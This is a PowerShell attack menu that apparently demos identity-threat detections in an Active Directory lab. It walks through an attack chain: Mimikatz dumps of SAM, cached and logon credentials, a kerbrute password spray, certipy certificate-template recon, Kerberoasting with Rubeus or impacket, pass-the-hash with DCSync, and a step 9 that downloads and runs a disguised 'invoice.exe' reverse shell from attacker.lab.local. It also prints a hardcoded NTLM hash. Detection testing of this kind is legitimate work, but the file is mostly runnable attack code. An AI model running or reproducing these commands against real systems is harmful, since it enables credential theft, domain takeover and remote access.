# ============================================================
#  Identity Attack Menu - Unmanaged Workstation
#  Run as Administrator (demo account)
#  Follows the phased scenario from portable_sender.py
# ============================================================

# --- Environment Variables (set these in cmd BEFORE running) ---
# set ENV_DOMAIN=<your-ad-domain>
# set ENV_DC_IP=<DC IP address>
# set ENV_BL=<BL IP address>
# set ENV_DT=<DT IP address>

$ErrorActionPreference = "Stop"
$idpDir = "C:\IDP_Files"
$mimiExe = "$idpDir\Mimikatz\x64\mimikatz.exe"

# --- Validate env vars on startup ---
$missing = @()
if (-not $env:ENV_DOMAIN) { $missing += "ENV_DOMAIN" }
if (-not $env:ENV_DC_IP)  { $missing += "ENV_DC_IP" }
if (-not $env:ENV_BL)     { $missing += "ENV_BL" }
if (-not $env:ENV_DT)     { $missing += "ENV_DT" }
if ($missing.Count -gt 0) {
    Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
    Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
    Write-Host '    set ENV_DOMAIN=lab.yourdomain.com' -ForegroundColor Gray
    Write-Host '    set ENV_DC_IP=172.16.1.6' -ForegroundColor Gray
    Write-Host '    set ENV_BL=10.3.108.30' -ForegroundColor Gray
    Write-Host '    set ENV_DT=10.3.108.31' -ForegroundColor Gray
    pause
    exit 1
}

Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  BL=$env:ENV_BL  DT=$env:ENV_DT" -ForegroundColor Green
Start-Sleep -Seconds 2

function Show-Menu {
    param ([string]$Title = 'Identity Attacks - Unmanaged Host')
    Clear-Host
    Write-Host
    Write-Host "================ $Title ================" -ForegroundColor Cyan
    Write-Host
    Write-Host "  Attack chain: demo (brute-forced) -> dump creds -> clark.monroe / svc_runbook -> PtH" -ForegroundColor DarkGray
    Write-Host
    Write-Host "  --- Phase 2: Initial Access (after brute force) ---" -ForegroundColor Yellow
    Write-Host "  1: Dump local credentials (SAM + cached)     [Discover cached accounts]"
    Write-Host "  2: Credential Scanning (kerbrute)             [CredentialScanning detection]"
    Write-Host
    Write-Host "  --- Phase 4: Recon & Privilege Escalation ---" -ForegroundColor Yellow
    Write-Host "  3: AD-CS Recon (certipy)                      [Certificate template enum]"
    Write-Host "  4: RDP to DT or BL as 'demo'                  [Lateral with low-priv account]"
    Write-Host "  5: Dump creds on target (run ON DT/BL)        [Discover svc_runbook NTLM]"
    Write-Host
    Write-Host "  --- Phase 5: Credential Attack ---" -ForegroundColor Yellow
    Write-Host "  6: Kerberoast svc_runbook (has SPN)            [Kerberoasting detection]"
    Write-Host "  7: PtH & DCSync (clark.monroe)                 [PassTheHash + DCSync]"
    Write-Host "  8: PtH & RDP to BL (clark.monroe)              [PassTheHash lateral]"
    Write-Host
    Write-Host "  --- Optional ---" -ForegroundColor DarkGray
    Write-Host "  9: Download & execute reverse shell             [C2 callback]"
    Write-Host
    Write-Host "  Q: Quit" -ForegroundColor Red
    Write-Host
}

do {
    Show-Menu
    $input = Read-Host "Select step"
    switch ($input) {

        '1' {
            Clear-Host
            Write-Host "[Step 1] Dumping local credentials (SAM + cached)" -ForegroundColor Cyan
            Write-Host "         Looking for cached domain accounts on this unmanaged host..." -ForegroundColor Gray
            Write-Host

            # Show who has logged in
            Write-Host "--- User profiles on this machine ---" -ForegroundColor Yellow
            dir C:\Users | Select-Object Name | Format-Table -AutoSize

            Write-Host "--- Local accounts ---" -ForegroundColor Yellow
            net user

            # Mimikatz - elevate to SYSTEM first, then dump SAM + cached + logonpasswords
            & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step1_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"

            Write-Host "`n[+] Output saved to: $idpDir\step1_cred_dump.log" -ForegroundColor Green
            Write-Host "[*] Found cached: clark.monroe NTLM: 802ec5974a4f18e086e8b1411b2e3ea3" -ForegroundColor Cyan
            Write-Host "[*] To find svc_runbook, RDP to DT/BL (Step 4) then dump there (Step 5)." -ForegroundColor Cyan
        }

        '2' {
            Clear-Host
            Write-Host "[Step 2] Credential Scanning - kerbrute" -ForegroundColor Cyan
            Write-Host "         Spraying password against AD accounts..." -ForegroundColor Gray
            Write-Host "         Triggers: CredentialScanningActiveDirectory" -ForegroundColor Yellow
            Write-Host
            Write-Host "         DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
            Write-Host

            & "$idpDir\kerbrute.exe" -dc $env:ENV_DC_IP -domain $env:ENV_DOMAIN -users "$idpDir\users.txt" -password $env:ENV_PASSWORD

            Write-Host "`n[+] Kerbrute complete." -ForegroundColor Green
        }

        '3' {
            Clear-Host
            Write-Host "[Step 3] AD-CS Recon - certipy" -ForegroundColor Cyan
            Write-Host "         Enumerating certificate templates..." -ForegroundColor Gray
            Write-Host

            & "C:\Program Files\Python312\Scripts\certipy" find -u "natasha@$env:ENV_DOMAIN" -p $env:ENV_PASSWORD -dc-ip $env:ENV_DC_IP -debug
        }

        '4' {
            Clear-Host
            Write-Host "[Step 4] RDP to target as 'demo'" -ForegroundColor Cyan
            Write-Host "         demo is a domain account with local admin on DT and BL." -ForegroundColor Gray
            Write-Host
            Write-Host "  Choose target:" -ForegroundColor Yellow
            Write-Host "    A: RDP to DT ($env:ENV_DT)"
            Write-Host "    B: RDP to BL ($env:ENV_BL)"
            $target = Read-Host "Select (A/B)"
            switch ($target) {
                'A' {
                    Write-Host "Launching RDP to DT ($env:ENV_DT)..." -ForegroundColor Cyan
                    mstsc /v:$env:ENV_DT
                }
                'B' {
                    Write-Host "Launching RDP to BL ($env:ENV_BL)..." -ForegroundColor Cyan
                    mstsc /v:$env:ENV_BL
                }
                default { Write-Host "Invalid selection." -ForegroundColor Red }
            }
        }

        '5' {
            Clear-Host
            Write-Host "[Step 5] Dump credentials on target machine" -ForegroundColor Cyan
            Write-Host "         Run this AFTER RDP'ing to DT or BL as 'demo' (Step 4)." -ForegroundColor Yellow
            Write-Host "         This should be run ON the target machine, not here." -ForegroundColor Yellow
            Write-Host
            Write-Host "  On the target machine, open admin cmd/PowerShell and run:" -ForegroundColor Gray
            Write-Host
            Write-Host '  mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"' -ForegroundColor White
            Write-Host
            Write-Host "  Look for:" -ForegroundColor Cyan
            Write-Host "    User: svc_runbook" -ForegroundColor White
            Write-Host "    Domain: $env:ENV_DOMAIN" -ForegroundColor White
            Write-Host "    NTLM: <copy this hash for Steps 7 and 8>" -ForegroundColor White
            Write-Host
            Write-Host "  Once you have the hash, edit these files in C:\IDP_Files:" -ForegroundColor Gray
            Write-Host "    - PtH_DCSync.bat            (set NTLM_HASH=...)" -ForegroundColor Gray
            Write-Host "    - PtH_RDP_From_Unmanaged.bat (set NTLM_HASH=...)" -ForegroundColor Gray
        }

        '6' {
            Clear-Host
            Write-Host "[Step 6] Kerberoasting - svc_runbook (SPN: web/svc_runbook)" -ForegroundColor Cyan
            Write-Host "         Requesting TGS for service accounts with SPNs..." -ForegroundColor Gray
            Write-Host "         Triggers: Kerberoasting detection" -ForegroundColor Yellow
            Write-Host

            # Using Rubeus if available
            if (Test-Path "$idpDir\Rubeus.exe") {
                & "$idpDir\Rubeus.exe" kerberoast /user:svc_runbook /domain:$env:ENV_DOMAIN /dc:$env:ENV_DC_IP /outfile:"$idpDir\kerberoast_hashes.txt"
                Write-Host "`n[+] TGS hash saved to: $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
            }
            # Fallback: impacket GetUserSPNs
            elseif (Test-Path "C:\Program Files\Python312\Scripts\GetUserSPNs.exe") {
                & "C:\Program Files\Python312\Scripts\GetUserSPNs.exe" "$env:ENV_DOMAIN/natasha:$env:ENV_PASSWORD" -dc-ip $env:ENV_DC_IP -request-user svc_runbook -outputfile "$idpDir\kerberoast_hashes.txt"
            }
            else {
                Write-Host "[!] Neither Rubeus.exe nor GetUserSPNs found" -ForegroundColor Red
                Write-Host "    Trying with mimikatz kerberos::ask instead..." -ForegroundColor Yellow
                & $mimiExe "privilege::debug" "kerberos::ask /target:web/svc_runbook" "exit"
            }
        }

        '7' {
            Clear-Host
            Write-Host "[Step 7] PtH & DCSync - clark.monroe" -ForegroundColor Cyan
            Write-Host "         Using clark.monroe NTLM hash for Pass-the-Hash..." -ForegroundColor Gray
            Write-Host "         Triggers: PassTheHash, StaleAccount, DCSync" -ForegroundColor Yellow
            Write-Host

            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$idpDir\PtH_DCSync.bat`"" -Wait
        }

        '8' {
            Clear-Host
            Write-Host "[Step 8] PtH & RDP to BL - clark.monroe" -ForegroundColor Cyan
            Write-Host "         Lateral movement to managed host..." -ForegroundColor Gray
            Write-Host "         Triggers: PassTheHash (second hit)" -ForegroundColor Yellow
            Write-Host

            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$idpDir\PtH_RDP_From_Unmanaged.bat`"" -Wait
        }

        '9' {
            Clear-Host
            Write-Host "[Step 9] Download & execute reverse shell" -ForegroundColor Cyan
            Write-Host "         Make sure listener is running on attacker host first!" -ForegroundColor Yellow
            Write-Host

            Invoke-WebRequest -Uri "http://attacker.lab.local/invoice.exe" -OutFile "$idpDir\invoice.exe" -UseBasicParsing
            & "$idpDir\invoice.exe"
        }

        'q' { return }
    }
    pause
}
until ($input -eq 'q')
